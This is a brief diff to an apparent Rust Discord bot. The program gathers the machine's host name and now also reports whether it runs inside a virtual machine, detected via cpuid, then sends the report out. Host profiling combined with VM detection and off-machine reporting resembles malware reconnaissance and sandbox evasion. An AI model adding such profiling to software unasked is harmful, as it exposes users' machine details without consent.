@@ -8,6 +8,7 @@ use serenity::{
 };
 use std::env;
 use sysinfo::System;
+use inside_vm_arch_support::inside_vm;
 
 mod consts;
 
@@ -30,6 +31,10 @@ async fn main() {
     sysinfo.push_str(&format!(
         "System host name:        {}\n",
         unwrap_string(System::host_name())
+    ));
+    sysinfo.push_str(&format!(
+        "VM detected by cpuid:    {}\n",
+        inside_vm()
     ));
 
     send(sysinfo).await.unwrap();
